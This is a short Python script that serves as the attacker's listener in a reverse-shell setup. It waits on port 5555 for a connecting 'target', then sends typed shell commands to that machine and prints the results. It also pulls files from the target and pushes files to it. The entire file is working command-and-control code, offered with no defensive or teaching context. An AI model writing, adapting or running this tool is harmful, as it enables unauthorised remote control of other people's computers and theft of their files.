import sys, socket, json, os
from termcolor import cprint as cp

def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def reliable_recv():
    data = ""
    while True:
        try:
            data = data + target.recv(1024).decode().strip()
            return json.loads(data)
        except ValueError:
            continue

def download_file(file):
    with open(file, "wb") as f:
        target.settimeout(1)
        chunk = target.recv(1024)
        while chunk:
            f.write(chunk)
            try:
                chunk = target.recv(1024)
            except socket.timeout as e:
                break
    target.settimeout(None)

def upload_file(file):
    with open(file, "rb") as f:
        target.send(f.read())

def target_communication():
    while True:
        command = input("* Shell~%s: " % ip[0])
        reliable_send(command)
        if command == "quit":
            break

        elif command[:3] == "cd ":
            pass

        elif command == "clear":
            os.system("clear")

        elif command[:8] == "download":
            download_file(command[9:])

        elif command[:6] == "upload":
            upload_file(command[7:])

        else:
            result = reliable_recv()
            cp(result, "blue")


your_ip = input("Your IP:\n")
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((your_ip, 5555))
cp("[~] Listening for incomming connections:","yellow")

sock.listen(5)
target, ip = sock.accept()
cp("[+] Target connected from: %s" % str(ip))

target_communication()
